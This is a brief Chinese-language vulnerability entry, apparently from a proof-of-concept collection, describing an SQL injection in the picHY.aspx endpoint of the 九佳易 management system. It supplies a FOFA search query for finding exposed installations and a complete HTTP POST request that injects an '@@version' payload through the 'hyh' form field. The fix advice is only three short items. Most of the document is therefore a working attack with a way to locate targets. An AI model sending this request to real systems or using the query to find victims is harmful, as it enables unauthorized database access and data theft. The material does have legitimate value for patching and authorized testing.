# 九佳易管理系统 picHY.aspx 接口 SQL注入漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 九佳易管理系统 picHY.aspx 接口 SQL注入漏洞 |
| 漏洞类型 | SQL注入 |
| 影响组件 | picHY.aspx |
| 影响版本 | 九佳易管理系统 |

## 漏洞概述

九佳易管理系统是一款企业管理软件。picHY.aspx 接口存在 SQL 注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

## fofa查询语句

```
title="VSQL" && body="/Scripts/Login_A8/"
```

## 漏洞复现

### POC

```http
POST /HuiYuan/HuiYuanDangAn/picHY.aspx HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xx.xx.xx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: 111

------WebKitFormBoundary
Content-Disposition: form-data; name="hyh"

'-1/@@version--
------WebKitFormBoundary--
```

### 漏洞特征

- 路径：/HuiYuan/HuiYuanDangAn/picHY.aspx
- HTTP方法：POST
- 参数：hyh
- Content-Type：multipart/form-data

## 修复建议

1. 打补丁
2. 使用参数化查询
3. 实施严格输入验证
